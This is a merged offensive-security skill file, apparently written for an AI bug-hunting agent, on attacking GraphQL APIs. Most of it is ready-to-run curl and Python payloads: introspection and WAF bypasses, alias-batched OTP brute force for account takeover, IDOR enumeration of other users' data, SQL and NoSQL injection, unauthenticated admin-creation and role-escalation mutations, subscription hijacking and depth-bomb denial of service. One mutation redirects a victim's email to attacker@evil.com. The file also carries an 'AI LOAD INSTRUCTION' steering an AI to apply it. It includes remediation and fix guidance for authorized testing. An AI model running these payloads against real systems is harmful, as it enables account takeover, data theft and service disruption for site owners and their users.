---
name: graphql-security
description: "GraphQL security hunting — introspection abuse, field suggestion enumeration (clairvoyance), batching DoS, IDOR via aliasing, auth bypass, injection via arguments, subscription abuse, depth/complexity bombs, and WAF bypass. Covers graphw00f fingerprinting, GraphQLmap, graphql-cop"
domain: api
merged: true
merged_from: [Agentic-Bug-Hunter:graphql-audit, hacking-skills:graphql-idor-via-introspection-leak, hack-skills:graphql-and-hidden-parameters]
---

# graphql-security

> **Fusionierter Skill** — vereint 3 Quell-Skills zu einem: `Agentic-Bug-Hunter:graphql-audit`, `hacking-skills:graphql-idor-via-introspection-leak`, `hack-skills:graphql-and-hidden-parameters`. Alle Techniken aller Quellen sind unten zusammengeführt, nichts ausgelassen.

## Quelle: Agentic-Bug-Hunter — graphql-audit (528 Zeilen)

# GRAPHQL SECURITY AUDIT

> GraphQL flips the threat model — clients drive queries. One endpoint, infinite attack surface. Introspection hands you the schema; even without it, field suggestions give you 80% back.

---

## 0. QUICK KILL CHECKLIST

```
[ ] Run graphql_audit.sh <endpoint> — full automated sweep
[ ] Check if introspection is enabled (__schema query)
[ ] If introspection off — run clairvoyance for field discovery
[ ] Fingerprint engine (graphw00f) — different engines, different CVEs
[ ] Test query batching — send 100 identical queries in one POST
[ ] Test alias bombing — 1000 aliases in one query
[ ] Check field suggestions on typos — leaks schema even when introspection off
[ ] Try IDOR: query another user's object by ID, no auth check
[ ] Test field-level auth: query privileged fields (admin, role, internalNote)
[ ] Inject SQLi/NoSQLi via string arguments — id, filter, search args
[ ] Check subscriptions: can you subscribe to other users' events?
[ ] Try introspection bypass: __schema\nquery, query batching, fragment tricks
[ ] Look for mutation rate limiting — account takeover / self-XSS via mutations
```

---

## 1. TOOL — graphql_audit.sh

```bash
# Basic audit
bash bughunter/tools/graphql_audit.sh https://target.com/graphql

# With auth cookie
bash bughunter/tools/graphql_audit.sh https://target.com/api/graphql --cookie "session=abc123"

# With Authorization header
bash bughunter/tools/graphql_audit.sh https://target.com/graphql --header "Authorization: Bearer TOKEN"

# Through Burp proxy
bash bughunter/tools/graphql_audit.sh https://target.com/graphql --proxy http://127.0.0.1:8080

# Custom output directory
bash bughunter/tools/graphql_audit.sh https://target.com/graphql --output-dir ./findings/target/graphql
```

**Output:** `findings/<target>/graphql/<timestamp>/`
- `introspection.json` — full schema dump (if enabled)
- `fingerprint.txt` — engine type (graphw00f)
- `field_suggestions.txt` — discovered fields via clairvoyance
- `batching_dos.txt` — response time delta for 1 vs 100 queries
- `alias_bomb.txt` — alias depth test results
- `injection.txt` — injection scan results (built-in SQLi probe)
- `cop_report.txt` — graphql-cop attack checklist results
- `summary.txt` — hit/miss per phase

---

## 2. INTROSPECTION — Schema Leak (Most Common First Step)

### Check If Enabled

```bash
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
```

### Full Schema Dump

```bash
# Pull complete introspection schema (pipe to InQL or graphql-voyager)
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"
  }' | jq . > schema.json
```

### What To Look For In The Schema

```
- Mutations involving user data: updateUser, deleteAccount, changeEmail, changePassword
- Queries returning other users' objects: user(id: X), order(id: X)
- Fields: internalNote, adminOnly, role, isAdmin, rawPassword, apiKey
- Types: AdminUser, InternalConfig, DebugInfo
- Deprecated fields — often bypassed auth or forgotten
- Subscription types — real-time data leaks
```

### Introspection Bypass Techniques

When `__schema` is blocked, try:
```bash
# Newline injection (bypasses naive keyword filters)
{"query": "query {\n  __schema\n  { queryType { name } } }"}

# Fragment trick
{"query": "fragment f on __Schema { queryType { name } } { ...f }"}

# __type instead of __schema (often overlooked in blocklists)
{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}

# Via GET request (some servers allow GET, filter only POST)
GET /graphql?query={__schema{queryType{name}}}

# Over WebSocket (GraphQL subscriptions)
# Different code path — introspection may be unrestricted
```

---

## 3. FIELD SUGGESTION ABUSE (Introspection Off — Still Works)

GraphQL engines return helpful "Did you mean X?" errors on typos. This leaks field names.

### Manual Probe

```bash
# Typo on a known field to trigger suggestions
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ usr { id } }"}' | grep -i "suggest\|did you mean\|Cannot query"
```

### Clairvoyance (Automated — Recommended)

```bash
# Install
pip install clairvoyance

# Run field discovery against a known type
clairvoyance -u https://target.com/graphql -o schema.json

# With auth
clairvoyance -u https://target.com/graphql \
  -H "Authorization: Bearer TOKEN" \
  -o schema.json

# Seed with known type names (speeds up discovery significantly)
clairvoyance -u https://target.com/graphql \
  --input-document schema_partial.json \
  -o schema_full.json
```

**What clairvoyance recovers:** type names, field names, argument names — ~80% of introspection output even when blocked.

---

## 4. BATCHING DoS (High Payout, Easy to Prove)

GraphQL allows sending multiple operations in one POST. No rate limit = DoS or brute-force amplifier.

### Array Batching (Most Common)

```bash
# 100 queries in one request — measure response time delta
python3 -c "
import json, sys
q = {'query': '{ __typename }'}
print(json.dumps([q] * 100))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @- -w '\nTime: %{time_total}s\n'
```

### Alias Batching (Bypasses per-query limits)

```bash
# 500 aliases — each alias is a separate resolver call
python3 -c "
aliases = ' '.join(f'q{i}: __typename' for i in range(500))
print('{\"query\": \"{ ' + aliases + ' }\"}')
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

### Impact Escalation

- **Brute force amplifier:** 100 login mutations per HTTP request → bypasses per-IP lockout
- **OTP bypass:** 1000 alias queries testing OTP codes in one request
- **Password reset bombing:** 100 resetPassword mutations, each with a different email

```bash
# OTP brute force via alias batching — chain with account takeover
python3 -c "
import json
mutations = []
for code in range(1000, 2000):
    mutations.append(f'v{code}: verifyOTP(code: \"{code}\", token: \"VICTIM_TOKEN\") {{ success }}')
query = '{ ' + ' '.join(mutations) + ' }'
print(json.dumps({'query': query}))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

---

## 5. IDOR VIA DIRECT OBJECT ACCESS

GraphQL queries often accept IDs directly. Test whether the server enforces ownership.

### Basic IDOR Probe

```bash
# Logged in as user A (id=1) — query user B's data
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=USER_A_COOKIE' \
  -d '{"query":"{ user(id: 2) { email phone address paymentMethods { last4 } } }"}'

# Try orders, messages, invoices, appointments
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=USER_A_COOKIE' \
  -d '{"query":"{ order(id: 999) { total items { name } user { email } } }"}'
```

### Field-Level IDOR (Privileged Fields on Accessible Objects)

```bash
# Object is yours — but are ALL fields yours to read?
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ me { id email role isAdmin internalNote rawApiKey } }"}'

# Test privileged mutations on other users
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { updateUser(id: 2, role: \"admin\") { success } }"}'
```

### Enumeration via Aliases

```bash
# Enumerate 50 user IDs in one request
python3 -c "
import json
aliases = [f'u{i}: user(id: {i}) {{ id email role }}' for i in range(1, 51)]
print(json.dumps({'query': '{ ' + ' '.join(aliases) + ' }'}))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

---

## 6. INJECTION VIA ARGUMENTS

GraphQL arguments pass directly to resolvers. Resolvers often pass them to SQL/NoSQL queries without sanitization.

### SQL Injection

```bash
# Classic SQLi probe via search/filter args
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(search: \"admin'\''--\") { id email } }"}'

# Time-based blind SQLi
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(id: \"1 AND SLEEP(5)--\") { email } }"}'

# GraphQLmap — interactive REPL, drive it by hand (no batch mode).
# NB: the tool formerly listed here as "gqlmap" never existed; its upstream
# is a dead repo and the PyPI name is a third-party placeholder.
graphqlmap -u https://target.com/graphql --method POST \
  --headers '{"Authorization":"Bearer <token>"}'
# then at the "GraphQLmap >" prompt: dump_new, or a query with a SQLi payload
```

### NoSQL Injection (MongoDB common in GraphQL backends)

```bash
# MongoDB operator injection via JSON coercion
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ login(username: {\"$gt\": \"\"}, password: {\"$gt\": \"\"}) { token } }"}'

# Regex bypass
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(filter: {email: {\"$regex\": \".*\"}}) { id email } }"}'
```

### SSTI via Template-Rendered Fields

```bash
# If description/bio fields render in templates
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { updateProfile(bio: \"{{7*7}}\") { bio } }"}'
```

---

## 7. AUTHORIZATION BYPASS PATTERNS

### Unauthenticated Queries

```bash
# Try sensitive queries without any auth token
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ users { id email role } }"}'

# Try mutations without auth
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { createAdmin(email: \"test@example.com\", password: \"pass\") { id } }"}'
```

### Horizontal → Vertical Privilege Escalation

```bash
# Step 1: Find role mutation in schema
# Step 2: Call it as a regular user
curl -s -X POST https://target.com/graphql \
  -H 'Cookie: session=NORMAL_USER' \
  -d '{"query":"mutation { updateUserRole(userId: ME_ID, role: \"ADMIN\") { success } }"}'
```

### Deprecated Field Auth Bypass

```bash
# Deprecated fields are often forgotten — auth checks removed or loosened
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ userProfile(id: 2) { legacyToken adminFlags } }"}'
```

---

## 8. SUBSCRIPTION ABUSE

WebSocket-based subscriptions can leak cross-user events if not scoped per-user.

```bash
# Subscribe to another user's events (Burp WebSocket tab or wscat)
# First: capture legitimate subscription query in Burp
# Then: change userId to victim's ID

wscat -c wss://target.com/graphql \
  -s 'graphql-ws' \
  --execute '{"type":"start","id":"1","payload":{"query":"subscription { orderUpdated(userId: VICTIM_ID) { status total } }"}}'

# Check if subscription delivers events for ALL users (no scoping)
# Critical if: payment status, message content, location updates
```

---

## 9. DEPTH / COMPLEXITY BOMBS

No query depth/complexity limits = DoS.

```bash
# Circular reference bomb (if schema has circular types)
# e.g. User -> friends -> User -> friends -> ...
python3 -c "
depth = 20
inner = 'id email'
for _ in range(depth):
    inner = f'friends {{ id {inner} }}'
print('{\"query\": \"{ me { ' + inner + ' } }\"}')
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @- -w '\nTime: %{time_total}s\n'

# If response time grows linearly — report as DoS
```

---

## 10. FINGERPRINTING & CVE HUNTING (graphw00f)

Different GraphQL engines have different CVEs. Fingerprint first.

```bash
# Install — NOT `pip install graphw00f`: that PyPI name is a third-party
# placeholder, not this tool. Install from source.
git clone https://github.com/dolevf/graphw00f && cd graphw00f && pip install -r requirements.txt

# Fingerprint
python3 -m graphw00f.main -d -t https://target.com/graphql

# Common engines and their known issues:
# Hasura       — auth bypass, remote schema injection
# Apollo       — query depth issues in old versions
# GraphQL-Go   — various older CVEs
# Graphene     — Python injection risk in custom resolvers
# Hot Chocolate — .NET, watch for SSRF in federation
# WPGraphQL    — WordPress + GraphQL = lots of IDOR
```

---

## 11. graphql-cop — Automated Attack Checklist

```bash
# Install — NOT `pip install graphql-cop`: that name is UNCLAIMED on PyPI,
# so a `pip install` hands execution to whoever registers it. Install from source.
git clone https://github.com/dolevf/graphql-cop && cd graphql-cop && pip install -r requirements.txt

# Run all checks
graphql-cop -t https://target.com/graphql

# With auth
graphql-cop -t https://target.com/graphql \
  -H "Authorization: Bearer TOKEN"

# Checks performed:
# - Introspection enabled
# - Field suggestions enabled
# - GET method supported
# - Query batching enabled
# - Alias overloading
# - Directive overloading
# - Deep recursion allowed
# - Character limit missing
# - Mutation introspection
```

---

## 12. WAF BYPASS FOR GRAPHQL

```bash
# Content-type switching (some WAFs only filter application/json)
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/graphql' \
  -d '{ __schema { queryType { name } } }'

# GET introspection (WAF may only block POST)
curl -s "https://target.com/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"

# Comment injection to break keyword matching
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ __sch#comment\nema { queryType { name } } }"}'

# Fragment-based introspection
curl -s -X POST https://target.com/graphql \
  -d '{"query":"fragment s on __Schema { queryType { name } } query { ...s }"}'
```

---

## 13. CHAINING FINDINGS

| Chain | Severity |
|---|---|
| Introspection → find admin mutations → call without auth | Critical |
| Batching → OTP brute force → account takeover | Critical |
| Field suggestions → discover hidden field → IDOR | High |
| Alias bomb → bypass rate limit → credential stuffing | High |
| Unauthenticated subscription → real-time PII leak | High |
| Depth bomb → no query limits → DoS | Medium |
| Deprecated field → PII exposure | Medium |

---

## 14. REPORT TEMPLATE

```
Title: GraphQL [VULN TYPE] — [Impact One-liner]

Example titles:
- "GraphQL Introspection Enabled — Full Schema Disclosure on api.target.com"
- "GraphQL Batching Allows OTP Brute Force — Account Takeover via Alias Bombing"
- "GraphQL IDOR via Direct Object Queries — Access Any User's Private Data"

Endpoint: POST https://target.com/graphql

Request:
[paste raw curl or HTTP request]

Response:
[paste relevant portion of response]

Impact:
[what an attacker can actually do RIGHT NOW — no hypotheticals]

Steps to Reproduce:
1. [exact curl or Burp Repeater step]
2. [observe the response]
3. [confirm impact]

CVSS (approximate):
- Introspection only: CVSS 5.3 (Medium) — info disclosure
- IDOR cross-user: CVSS 7.5-8.5 (High)
- Batching ATO chain: CVSS 9.0+ (Critical)
- Unauthenticated mutation: CVSS 9.8 (Critical)

Remediation:
- Disable introspection in production (allow only in dev environments)
- Enforce per-query depth limit (recommend <= 10)
- Enforce complexity limits
- Disable query batching or add per-batch rate limits
- Validate object ownership in every resolver (not just at route level)
- Remove field suggestions in production
```

---

## KILL SIGNALS — Walk Away

```
- Endpoint returns 404/410 consistently — not active
- All queries return generic "Unauthorized" with no suggestions — well-hardened
- Rate limit fires on query 2 — strong protection, low ROI
- Only __typename accessible, no types — schema fully locked down
- Engine is Apollo Federation gateway only — attack the downstream services instead
```

---

## TOOLS REFERENCE

| Tool | Purpose | Install |
|---|---|---|
| `graphql_audit.sh` | Automated multi-phase sweep | this repo |
| `graphw00f` | Engine fingerprinting | `git clone https://github.com/dolevf/graphw00f` — PyPI name is a third-party placeholder, not the tool |
| `clairvoyance` | Field discovery (no introspection) | `pipx install clairvoyance` — genuine, published by upstream |
| `graphql-cop` | Attack checklist runner | `git clone https://github.com/dolevf/graphql-cop` — UNCLAIMED on PyPI, do not `pip install` |
| `GraphQLmap` | SQL/NoSQL injection (interactive REPL) | `pipx install git+https://github.com/swisskyrepo/GraphQLmap.git` |
| `inql` | Burp Suite extension — schema + IDOR | Burp BApp Store |
| `graphql-voyager` | Visual schema explorer | browser tool |
| `wscat` | WebSocket subscription testing | `npm i -g wscat` |

## Quelle: hacking-skills — graphql-idor-via-introspection-leak (133 Zeilen)

# GraphQL IDOR via Introspection Leak Hunting

## What Is Broken and Why

GraphQL resolvers often receive an `id` argument supplied by the client but fail to verify that the authenticated user owns the referenced object. Authorization is typically implemented at the HTTP middleware layer (REST-style) and never propagated down to individual resolvers — creating a gap when GraphQL is bolted on later. Introspection leaks the full schema, letting an attacker enumerate every query and mutation that accepts an ID argument, then systematically probe each one for missing ownership checks.

## Key Signals

- Introspection not disabled — `__schema` returns data in production
- `id` arguments typed as `ID!` or `String!` with no documented ownership constraint
- Objects expose sensitive fields (PII, tokens, internal metadata) retrievable by bare ID
- App uses Relay global IDs (base64-encoded `TypeName:uuid`) — trivially enumerable
- Error messages like `"Not found"` vs `"Forbidden"` reveal object existence (oracle)
- Batching enabled — can enumerate hundreds of IDs in one request without rate limiting
- Dual-stack architecture (REST + GraphQL) where REST has authz middleware but GraphQL resolvers were added later

## Methodology

1. **Discover the endpoint** — probe `/graphql`, `/api/graphql`, `/v1/graphql`, `/gql`
2. **Run introspection** — dump the full schema
3. **Identify object types with ID args** — look for queries/mutations accepting `id`, `userId`, `resourceId`, `ownerId`
4. **Create two test accounts** — Account A (attacker) and Account B (victim)
5. **Grab a victim resource ID** — note an object ID owned by Account B
6. **Query as attacker** — from Account A's session, call the resolver with Account B's ID
7. **Test mutations too** — attempt `update`, `delete`, `transfer` mutations with cross-account IDs
8. **Test unauthenticated** — remove session token entirely; some resolvers skip auth at the GraphQL layer
9. **Confirm impact** — verify you can read, modify, or delete data you don't own

## Payloads & Tools

**Full introspection dump:**
```graphql
{ __schema { types { name fields { name args { name type { name kind ofType { name } } } } } } }
```

**Targeted type introspection:**
```graphql
{ __type(name: "User") { fields { name type { name kind } } } }
```

**Cross-account read:**
```graphql
{ user(id: "VICTIM_ID") { email phone internalNotes } }
```

**Cross-account mutation:**
```graphql
mutation { updateUserEmail(userId: "VICTIM_ID", newEmail: "attacker@evil.com") { success } }
```

**Relay node interface probe:**
```graphql
{ node(id: "VXNlcjoxMjM0") { ... on User { email phone } } }
```
Decode/re-encode: `echo -n "User:1234" | base64` → `VXNlcjoxMjM0`

**Alias batching for enumeration:**
```graphql
{
  a1: user(id: "001") { email }
  a2: user(id: "002") { email }
  a3: user(id: "003") { email }
}
```

**Tools:** InQL (Burp extension) for schema visualization; GraphQL Voyager for graph traversal; `graphql-cop` for automated security checks; `clairvoyance` for introspection-blocked schema reconstruction.

## Bypass Techniques

- **Alias batching** — 100 ID lookups in one request, bypassing per-request rate limits
- **Type confusion** — integers: try sequential enumeration; UUIDs: check for Relay base64 encoding
- **Fragment reuse** — use fragments to reduce query size and evade WAF pattern matching
- **Mutation chaining** — chain read + mutation atomically to exfiltrate and modify in one request
- **Variable injection** — move IDs into GraphQL variables instead of inline literals to bypass naive input filters
- **Persisted queries** — if the app supports persisted query IDs, find a stored query that skips authz
- **Field aliasing on introspection-blocked endpoints** — try `{a:__schema{...}}` if unaliased introspection is blocked

## Exploitation Scenarios

### Scenario 1 — Invoice Read IDOR
Setup: Invoicing app exposes `getInvoice(id: ID!)`. Introspection shows it returns `amount`, `clientEmail`, `lineItems`. → Trigger: Account A queries with Account B's invoice ID. → Impact: Full invoice details returned. Authorization enforced only on legacy REST route.

### Scenario 2 — Mutation-Based Account Takeover
Setup: SaaS platform has `updateUserEmail(userId: ID!, newEmail: String!)`. Resolver validates session is authenticated but not that `userId` matches the session user. → Trigger: Attacker calls mutation with victim's `userId`. → Impact: Email changed, password reset completes account takeover.

### Scenario 3 — Unauthenticated Relay Node Leak
Setup: App using Relay exposes `node(id: ID!)`. Global IDs are base64-encoded (`User:1234`). No authentication guard on resolver. → Trigger: Unauthenticated attacker decodes and re-encodes sequential IDs. → Impact: Names, emails, profile photos for all registered users without a session.

## False Positives

- Introspection returns schema but all resolvers enforce ownership — confirm by actually crossing account boundaries
- `id` argument present but resolver reads the ID from session context, ignoring the supplied value
- `"Not found"` returned for both valid and invalid cross-account IDs — no oracle, no leak
- Relay `node(id:)` returns data but only for public/non-sensitive types (e.g. public posts)

## Fix Patterns

```js
// WRONG: resolver trusts client-supplied ID
async getInvoice(_, { id }, { db }) {
  return db.invoices.findById(id);
}

// CORRECT: enforce ownership in the query
async getInvoice(_, { id }, { db, currentUser }) {
  const invoice = await db.invoices.findOne({ id, ownerId: currentUser.id });
  if (!invoice) throw new ForbiddenError("Not authorized");
  return invoice;
}
```

- Disable introspection in production (or restrict to authenticated/internal users only)
- Apply authorization at the **resolver level**, not just at the HTTP middleware layer
- Never trust client-supplied IDs — always scope DB queries to the authenticated user's context
- Use a dedicated authorization layer (e.g. graphql-shield, OPA) applied uniformly across all resolvers
- Treat GraphQL as a separate attack surface from REST even when they share the same database

## Related Skills

[[bola-idor]] is the underlying vulnerability that introspection exposes paths to find — introspection maps the schema while BOLA methodology validates each resolver for missing ownership checks. The general [[authz-bypass]] technique of replaying requests with a different session applies directly: enumerate types via introspection, then replay with Account B's session using Account A's object IDs. Introspection-disabled APIs can still be partially reconstructed using clairvoyance, mirroring the reconnaissance role of [[web-fingerprinting]] for REST targets.

## Quelle: hack-skills — graphql-and-hidden-parameters (50 Zeilen)

# SKILL: GraphQL and Hidden Parameters — Introspection, Batching, and Undocumented Fields

> **AI LOAD INSTRUCTION**: Use this skill when GraphQL exists or when REST documentation suggests optional, deprecated, or undocumented fields. Focus on schema discovery, hidden parameter abuse, and batching as a force multiplier.

## 1. GRAPHQL FIRST PASS

```graphql
query { __typename }
query {
  __schema {
    types { name }
  }
}
```

If introspection is restricted, continue with:

- field suggestions and error-based discovery
- known type probes like `__type(name: "User")`
- JS and mobile bundle route extraction

## 2. HIGH-VALUE GRAPHQL TESTS

| Theme | Example |
|---|---|
| IDOR | `user(id: "victim")` |
| batching | array of login or object fetch operations |
| hidden fields | admin-only fields exposed in type definitions |
| nested authz gaps | related object fields with weaker checks |

## 3. HIDDEN PARAMETER DISCOVERY

Look for:

- fields present in admin docs but not public docs
- `additionalProperties` or permissive schemas
- frontend code using richer request bodies than visible UI controls
- mobile endpoints carrying role, org, feature-flag, or internal filter fields

## 4. NEXT ROUTING

- If hidden fields affect privilege: [api authorization and bola](../api-authorization-and-bola/SKILL.md)
- If GraphQL batching changes auth or rate behavior: [api auth and jwt abuse](../api-auth-and-jwt-abuse/SKILL.md)
- If endpoint discovery is incomplete: [api recon and docs](../api-recon-and-docs/SKILL.md)
